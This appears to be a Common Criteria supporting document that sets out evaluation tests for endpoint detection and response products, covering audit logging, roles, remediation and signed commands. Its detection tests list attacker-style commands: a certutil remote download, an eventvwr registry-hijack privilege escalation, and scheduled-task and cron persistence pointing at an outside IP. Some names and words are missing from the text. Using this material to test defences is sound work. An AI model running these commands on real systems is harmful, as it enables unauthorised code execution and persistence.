    PP-Module for  is
    to describe the security functionality of 
    
    products in terms of 
    [CC] and to define functional and assurance requirements for them.

    
    The PP-Module is intended for use with the following Base-PP:
        <ul><li>Application Software, version 1.3.</li></ul><br/>
    This SD is mandatory for evaluations of TOEs that claim conformance to a PP-Configuration that includes the PP-Module for :
    <ul><li>, Version 1.0</li></ul>
    As such it defines Evaluation Activities for the functionality described in the PP-Module as well as any impacts to the Evaluation Activities to the Base-PP(s) it modifies.
    </p><p> 
Although Evaluation Activities are defined mainly for the evaluators to follow, in general they also help developers to prepare for evaluation by identifying specific requirements for their TOE.
    The specific requirements in Evaluation Activities may in some cases clarify the meaning of Security
    Functional Requirements (SFR), and may identify particular requirements for the content of Security
    Targets (ST) (especially the TOE Summary Specification), user guidance documentation, and possibly
    supplementary information (e.g. for entropy analysis or cryptographic key management architecture).</p><h2 id="structure" class="indexable" data-level="1">1.2 Structure of the Document</h2><p>Evaluation Activities can be defined for both SFRs and Security Assurance Requirements (SAR),
    which are themselves defined in separate sections of the SD.</p><p>If any Evaluation Activity cannot be successfully completed in an evaluation, then
    the overall verdict for the evaluation is a 'fail'.
    In rare cases there may be acceptable reasons why an Evaluation Activity
    may be modified or deemed not applicable for a particular TOE, 
    but this must be approved by the Certification Body for the evaluation.</p><p>In general, if all Evaluation Activities (for both SFRs and SARs) are successfully
    completed in an evaluation then it would be expected that the overall verdict for 
    the evaluation is a ‘pass’.
    To reach a ‘fail’ verdict when the Evaluation Activities have been successfully 
    completed would require a specific justification from the evaluator as to why the 
    Evaluation Activities were not sufficient for that TOE.
    </p><p>Similarly, at the more granular level of assurance components, if the Evaluation 
    Activities for an assurance component and all of its related SFR Evaluation 
    Activities are successfully completed in an evaluation then it would be expected 
    that the verdict for the assurance component is a ‘pass’.
    To reach a ‘fail’ verdict for the assurance component when these Evaluation 
    Activities have been successfully completed would require a specific justification 
    from the evaluator as to why the Evaluation Activities were not sufficient for that TOE.

    to address technology specific aspects covering specific SARs (e.g. ASE_TSS.1, 
    ADV_FSP.1, AGD_OPE.1, and ATE_IND.1) – this is in addition to the CEM workunits 
    that are performed in Section <a href="#sar_aas" class="dynref">3 Evaluation Activities for SARs</a>.</p><p>Regarding design descriptions (designated by the subsections labeled TSS, as 
    well as any required supplementary material that may be treated as proprietary), 
    the evaluator must ensure there is specific information that satisfies the EA. 
    For findings regarding the TSS section, the evaluator’s verdicts will be 
    associated with the CEM workunit ASE_TSS.1-1.
    Evaluator verdicts associated with the supplementary evidence will also be 
    associated with ASE_TSS.1-1, 
    since the requirement to provide such evidence is specified in ASE in the PP.</p><p>For ensuring the guidance documentation provides sufficient information for 
    the administrators/users as it pertains to SFRs, the evaluator’s verdicts will 
    be associated with CEM workunits ADV_FSP.1-7, AGD_OPE.1-4, and AGD_OPE.1-5.</p><p>Finally, the subsection labeled Tests is where the authors have determined 
    that testing of the product in the context of the associated SFR is necessary.
    While the evaluator is expected to develop tests, there may be instances where 
    it is more practical for the developer to construct tests, or where the 
    developer may have existing tests. 
    Therefore, it is acceptable for the evaluator to witness developer-generated 
    tests in lieu of executing the tests. 
    In this case, the evaluator must ensure the developer’s tests are executing both 
    in the manner declared by the developer and as mandated by the EA. 
    The CEM workunits that are associated with the EAs specified in this section 
    are: ATE_IND.1-3, ATE_IND.1-4, ATE_IND.1-5, ATE_IND.1-6, and ATE_IND.1-7.</p><h2 class="indexable" data-level="1" id="aa-">2.1 Application Software</h2>

                  The evaluator
                  shall follow guidance to enroll a Host Agent to the EDR and verify that the
                  enrollment action is recorded in an auditable and timestamped activity log.
                  For Windows, the evaluator shall test the EDR's ability to detect
                  anomalous activity by performing the following subtests based on the platform of
                  the enrolled Host Agent's system, verifying for each that, corresponding alerts
                  were generated in the management dashboard:
                    The evaluator shall open a Windows command prompt as a user and run the
                      command cmd /c certutil -urlcache -split -f &lt;remote file&gt;

                      valid directory path writable by the current local user. 
                    The evaluator shall open a Windows command prompt as a user and run the
                      command reg.exe add hkcu\software\classes\mscfile\shell\open\command
                        /ve /d "&lt;local executable&gt;" /f, where the local executable is a
                      valid file path to a readable, local executable. The evaluator will then run
                      the command cmd.exe /c eventvwr.msc in the same command
                      prompt window. 
                    The evaluator shall open a Windows command prompt as a user and run the
                      command SCHTASKS /Create /SC ONCE /TN spawn /TR &lt;local
                        executable&gt;" /ST &lt;time&gt;, where the local executable is a
                      valid file path to a readable, local executable, and time is a start time that
                      occurs within minutes of the task being created. 
                  
                  For Linux, the evaluator shall test the EDR's ability to detect
                  anomalous activity by performing the following subtests based on the platform of
                  the enrolled Host Agent's system, verifying for each that, corresponding alerts
                  were generated in the management dashboard:
                  
                    The evaluator shall open a terminal and run the command scp
                      &lt;remote user&gt;@&lt;remote host&gt;:&lt;remote path&gt;
                      &lt;download directory&gt;, where the remote user is a valid user on
                      remote host, remote path is a valid path to a remotely stored executable, and the 
                      download directory is a valid directory path writable by the current local
                      user. The remote user's password shall be provided when prompted. 
                    
                    The evaluator shall open a terminal and run the command echo

                      /etc/cron.hourly/persist, where the outside IP is a valid
                      external address.
                  
                  For all platforms:
                  
                    The evaluator shall review an alert on the management dashboard and verify that
                      the alert contains a severity field and the fields specified in the ST.
                      The evaluator will open or view the alert and verify that a timeline of
                      events is available for review. The timeline shall show a progression of events
                      over time.
                    The evaluator shall pick an alert on the management dashboard and export the
                      alert in every format specified in the ST. The evaluator shall review the operational
                      guidance and the selection from the requirement and verify that export options
                      exist for all the declared formats in the selection. After exporting one alert for
                      each possible format the evaluator shall review the file contents of the exported
                      alert and verify it is the correct format for the selected export option (for
                      example, an export of the IODEF type must contain 'IODEF-Document' in the first
                      element of the exported file).

                    The evaluator shall verify the OS version, architecture, and IP address of
                    a system managed by a Host Agent against the data reported to the EDR.
                    The evaluator shall log in to a system managed by a Host Agent with two separate
                    accounts and verify that the activity is accurately reported to the EDR.
                    The evaluator shall run a known user application provided on the platform OS and verify
                    that subsequent process creation and module loading is accurately reported to the EDR.
                    The evaluator shall create a new non-empty document within persistent storage and verify
                    that the activity is accurately reported to the EDR.
                    The evaluator shall perform an action that causes an event 
                      to occur for all items in the assignment and verify the activity is reported to the EDR.

            FMT_SMF.1 Specification of Management Functions

         
            
              Refinement: The EDR shall generate an audit record of the following auditable events: 
                
                  Start-up and shutdown of the audit functions;
                  All auditable events for the [not specified] level of audit; and
                
                [
                  
                EDR management dashboard log in activity;
                  Remediation commands sent to a Host Agent, affected endpoint, or network
                    devices;
                  EDR configuration changes;
                  Other auditable events
                  
                ].
              

              
              
              The intent of this requirement is to specify the minimum set
                of audit records generated about actions on the EDR. 
              
            
            
            
              Refinement: The EDR shall record within each audit record at least the following information: 
                
                  Date and time of the event,
                  Type of event,
                  Subject identity,
                  Outcome (success or failure) of the event,
                  For each audit type, based on the auditable event definitions of the functional components included in the PP/ST, Other audit relevant information.
                
            
   
             This requirement outlines the information to be included in audit records. All audits must 
              contain at least the information mentioned in FAU_GEN.1.2/EDR, but may contain more information 
              which can be assigned. 
              
            
              The evaluator shall check the TSS and ensure that it lists all of the auditable events claimed in the SFR. 
                The evaluator shall check to make sure that every audit event type specified by the SFR is described in the TSS. 
                The evaluator shall check the TSS and ensure that it provides a format for audit records. 
                Each audit record format type must be covered, along with a brief description of each field.
                                          
              
               The evaluator shall check the administrative guide and ensure that it lists all of the auditable events claimed in the SFR. 
                The evaluator shall check to make sure that every audit event type mandated by the SFR is described. 
                The evaluator shall examine the administrative guide and make a determination of which 
                commands are related to the configuration (including enabling or disabling) 
                of the mechanisms implemented in the EDR that are necessary to enforce the 
                requirements specified in the PP-Module. The evaluator shall document the methodology or 
                approach taken while determining which actions in the administrative guide are security relevant with 
                respect to this PP-Module. The evaluator may perform this activity as part of the activities 
                associated with ensuring the AGD_OPE guidance  satisfies the requirements.
                The evaluator shall check the administrative guide and ensure that it provides a format for audit records. 
                Each audit record format type must be covered, along with a brief description of each field. The evaluator shall 
                check to make sure that the description of the fields contains the information required in FAU_GEN.1.2/EDR.
              
              The evaluator shall perform the following tests:
                
                  The evaluator shall login to the EDR management dashboard and verify that audit
                    log data describing the activity is recorded.
                  The evaluator shall issue a valid remediation command provided by the EDR to
                    a Host Agent and verify that audit log data describing the activity is recorded on the EDR management dashboard.
                  The evaluator shall change a non-destructive EDR configuration option within the EDR management
                    dashboard, change it back to the original setting, and verify that the audit log data describing
                    the activity is recorded.
                  The evalutor shall perform the action to generate all other auditable 
                    events listed in the assignement and verify the activity is recorded.
                
                When verifying the test results from FAU_GEN.1.1/EDR, the evaluator shall ensure the audit records generated during 
                testing match the format specified in the administrative guide, and that the fields in each audit record have the proper entries.
                 
                Note that the testing here can be accomplished in conjunction with the testing of the security mechanisms directly. 
                For example, testing performed to ensure that the administrative guidance provided is correct verifies that AGD_OPE.1 
                is satisfied and should address the invocation of the administrative actions that are needed to verify the audit records 
                are generated as expected.

                The evaluator shall perform the following tests:
                  
                    The evaluator shall verify that passwords up to 64 characters are supported.
                     The evaluator shall verify that password composition rules present in operational guidance
                      are enforced. While the evaluator is not required (nor is it feasible) to test all possible
                      composition rules, the evaluator shall ensure that all characters are supported, and rule characteristics
                      listed in the requirement are enforced.

            This SFR defines a specific set of management functions for an
              EDR by an EDR. It does not impact the  functionality.
          
            Refinement:  The EDR shall be capable of performing the following
                management functions: 
                
                  Administrator
                  SOC Analyst
                  Read-Only User

               This requirement captures all the configuration
                functionality the TSF provides the administrator to configure the
                EDR. 
              
                
                Chart legend: M = Mandatory, O = Optional, - = N/A
              
                The evaluator shall verify the TSS contains a list of roles and what functions they can perform.  
                  The evaluator shall verify the list matches the chart in the requirement.
                The evaluator shall review the operational guidance to verify that the EDR has
                  documented capabilities to perform the management functions.
                The evaluator shall perform the below tests with each role, 
                  verifying each role is denied or can complete the action below as specified by the chart in the SFR:
                  
                    The evaluator shall configure the amount of time to retain collected EDR data
                    to a time frame in which existing data will be made unavailable and verify that the
                    data is no longer accessible through the EDR management dashboard.
                    The evaluator shall logically or physically inhibit the network communications
                    between a managed endpoint system and the EDR server and verify that the inhibited or halted
                    connectivity status of the Host Agent is recognized on the EDR management dashboard.
                    The evaluator shall use a file that triggers an incident alert to test the suppression
                    of such alerts for that specific file. Upon confirming the creation of incident alerts on access
                    to the file, the evaluator shall configure suppression of the alert for each available
                    suppression denylist file or metadata characteristic and verify that incident alerts are
                    categorized as suppressed, hidden, unavailable, or never created.
                    The evaluator shall attempt each function with each role and verify access conforms with the chart in the requirement.
                  
                
              
            
          
          
  
          
            This SFR defines a specific set of management functions for a
              Host Agent by an EDR. It does not impact the  functionality.
            
              Refinement: The EDR shall be capable of performing the following functions that control
                behavior of the Host Agent:
                
                  Administrator
                  SOC Analyst
                  Read-Only User
                  
                    Configure the time frame for sending Host Agent data to the EDR
                        list of configurable time frames
                    
                    
                  
                  
                    Assign a label or tag to categorize or group individual endpoint systems 
                    
                  
                
              
              This requirement captures all the configuration
                functionality the EDR provides the administrator to configure the
                EDR Host Agents. 
              Chart legend: M = Mandatory, O = Optional, - = N/A
              
                The evaluator shall verify the TSS contains a list of roles and what functions they can perform.  
                  The evaluator shall verify the list matches the chart in the requirement.
                The evaluator shall review the operational guidance to verify that the EDR has
                documented capabilities to perform the management functions.
                The evaluator shall perform the below tests:
                 
                   The evaluator shall modify the time frame for sending Host Agent data to the EDR
                   and verify that an affected Host Agent is sending data at the intended interval.
                   The evaluator shall tag or categorize a group of individual endpoint systems and
                   verify that the tag or categorization persists within the EDR management dashboard for
                   other users.
                   The evaluator shall attempt each function with each role and verify access conforms with the chart in the requirement.
                 
                
              
            
          
          
          
          
          
          
             This SFR defines a specific set of management roles for an EDR.
              It does not impact the  functionality.         
            
            
              Refinement: The EDR shall maintain the roles [administrator, SOC analyst, read-only
                user].
            
            
              Refinement: The EDR shall be able to associate users with roles.
            
            The EDR will be configured, maintained, and
                used by different user roles. At a minimum, one administrative role shall be
                supported, one SOC analyst who can issue remediation commands to host agents, and
                one read-only user who can only view data.  
                The user accounts need not be named literally, but they must have the implication of such roles.
              CC Part 2 specifies FIA_UID.1 as a dependency of this requirement because the TSF must have some way of identifying users so that they can be associated with management roles. 
              This dependency is implicitly addressed through FIA_AUT_EXT.1, which specifies an alternative method of user identification.
              
                
                 The evaluator shall examine the TSS to verify that it
                  describes the roles and the powers granted to and limitations of the role. 
                 The evaluator shall review the operational guidance to ensure that it
                  contains instructions for administering the EDR, which user
                  roles are supported, and which permissions each role has.
                
                  
                    The evaluator shall verify that the roles of administrator, SOC analyst, and
                      read-only user are available, creating individual accounts with each
                      role assigned.
                    The evaluator shall verify that non-administrator roles are not able to modify
                      the roles of their own account or those of others.
                    In the course of performing the testing activities for the evaluation,
                      the evaluator shall use all supported interfaces, although it is not
                      necessary to repeat each test involving an administrative action with each
                      interface. The evaluator shall ensure, however, that each supported method
                      of administering the EDR that conforms to the requirements
                      of this PP be tested; for instance, if the EDR can be administered through a local hardware interface or
                      TLS/HTTPS then both methods of administration must be exercised during the
                      execution of the test activities.
                    The evaluator shall attempt each function with each role and verify access conforms with the chart in the requirement.
                  
                
              
            
          
          
          
          
            Components in this family define requirements for remediation functions that an EDR can perform to affect the behavior of an endpoint system.
          

          
             This SFR defines a specific set of remediation functions for an
              EDR. It does not impact the  functionality. 
            
             lists the supported remediation functions and identifies the management roles that may perform these functions.
            No specific management functions are identified.
            There are no auditable events foreseen.
            FMT_SMR.1 Security Management Roles
            
            
               The EDR shall be capable of performing the following
                remediation functions: 
                
                  Administrator
                  SOC Analyst
                  Read-Only User
                  
                  
                     Quarantine an endpoint by 
                      
                        logically quarantining the endpoint from the network unless allowlisted
                        quarantining the malicious file on the endpoint
                     
                    
                  
                  
                     Terminate a running process on an endpoint 
                    
                  
                  
                     Retrieve potentially unauthorized or affected files from an endpoint 
                    
                  
                
              
               This requirement captures all the remediation functionality
                the EDR provides the SOC Analyst and optionally the Administrator.
                Logically quarantine from the network refers to restricting communications from the endpoint to the rest of the network, 
                it may include a restricted allowlist.
               
                
                Chart legend: M = Mandatory, O = Optional, - = N/A
              
                The evaluator shall check to ensure that the TSS describes what roles can perform what 
                  remediation actions and how each remediation action is performed.
                The evaluator shall review the operational guidance to verify that the EDR has
                  documented capabilities to perform the management functions.
                For each role, the evaluator shall perform the below tests, verifying that each role in the chart can 
                  perform their permitted functions and are restricted from performing functions that they do not have access to per the 
                  legend (Chart legend: X = Mandatory, O = Optional, - = N/A):
                  
                    Conditional: If "logically quarantining the endpoint from the network unless allowlisted" is selected 
                      the evaluator shall logically quarantine a managed endpoint system from the
                    network and verify that the system is unable to access network addresses or resources
                    outside of an allowlist.
                    Conditional: If "quarantining the malicious file on the endpoint" is selected 
                      the evaluator shall verify the functionality to quarantine potentially unauthorized files on the endpoint.
                    The evaluator shall run an executable on a managed endpoint system, terminate
                    its process from the EDR management dashboard, and then verify that the process is no
                    longer running on the system.
                    The evaluator shall place a file known to trigger an incident alert on the file system then retrieve the 
                      contents of the file from the EDR management dashboard.

             This SFR defines a specific set of functions for logically distinct secure
              communication with a Host Agent. It does not impact the  functionality. 
            
              Refinement: The  EDR shall
                
                  
                    implement 
                    
              				TLS as defined in the TLS Package
                      HTTPS as defined in the Base-PPinvoke platform-provided functionality for
                   
              			TLS
              			HTTPS
                   
                 
                
                to protect TSF data from [modification, disclosure] when it is transmitted between separate parts of the TOE. 
               The intent of the above requirement is to use the
                cryptographic protocols identified in the requirement to establish and maintain a
                trusted channel between the EDR and the Host Agent, which are considered to be separate parts of the TOE. The TLS Package permits the use of either TLS or DTLS. Only TLS, DTLS, or
                HTTPS can be used in this trusted channel. 
		      
		      This requirement is to
                ensure that the transmission of any logs, process lists, system information, etc,
                when commanded, or at configurable intervals, is properly protected. This internal
                channel also protects any commands and policies sent by the EDR to
                the Host Agent. Either the Host Agent or the EDR is able to
                initiate the connection.  
		      
		      This internal channel protects both the
                connection between an enrolled Host Agent and the EDR and the
                connection between an unenrolled Host Agent and the EDR during the
                enrollment operation. Different protocols can be used for these two connections, and
                the description in the TSS should make this difference clear.
                
		      
		      The internal channel uses a protocol from the TLS Package or HTTPS as the protocol that preserves
                the confidentiality and integrity of EDR communications. The ST author chooses the mechanism 
                or mechanisms supported by the EDR, and then ensures the correct requirements are included in the 
                ST if not already present. Protocol, RBG, certificate validation,
                algorithm, and similar services may be met with platform-provided services. 
        
		    

              
                

             
                 If "invoke platform-provided functionality for..." is selected, the evaluator shall verify the TSS contains the calls to the platform that TOE is leveraging to invoke the functionality. 

	
			
			If "implement..." is selected, the evaluator shall examine the TSS to verify how Agent-Server communications are protected is described and conforms to the SFR. 
                  The evaluator shall also confirm that all protocols
                  listed in the TSS are consistent with those specified in the requirement, and are
                  included in the requirements in the ST.

          Components in this family define how the TOE can assert the authenticity of the remediation actions it requests from Host Agents.
        

        
          This SFR defines protections for the integrity of commands sent to
            the Host Agent. It does not impact the  functionality. 
          
          
           requires all management activities bound for a Host Agent to be digitally signed.
          No specific management functions are identified.
          There are no auditable events foreseen.
          No dependencies.
          
            
            
              The 
                
                  EDR
                  EDR Platform
                 
                shall digitally sign commands and policies sent to the Host Agent using
                
                  RSA
                  ECDSA
                 signatures that meet FIPS PUB 186-4.
              
            
             The intent of this requirement is to cryptographically tie any policy updates or
            commands sent to the Host Agent as being from the EDR. This is not to 
            protect the policies in transit as they are already protected by FPT_ITT.1. 
            If the TSF implements this function, any signature algorithms used should be consistent with any selections made in 
            FCS_COP.1(3).
            
              The evaluator shall check to ensure that the TSS describes how all commands and policies are signed.
              The evaluator shall review the operational guidance and ensure that the
                EDR any configuration information for policy signing is included.
              
              The evaluator shall select any one remediation function documented in the
                administrative guide (e.g., terminate process), and execute that command
                while capturing traffic. The evaluator shall review captured network traffic and
                verify that a digital signature was sent along with the coinciding command or policy update.
                The EDR may need to be configured in a manner to disable transport
                encryption for this test or the network capture tool may need to be
                configured with the private key such that decrypted traffic can be made
                available to the evaluator.
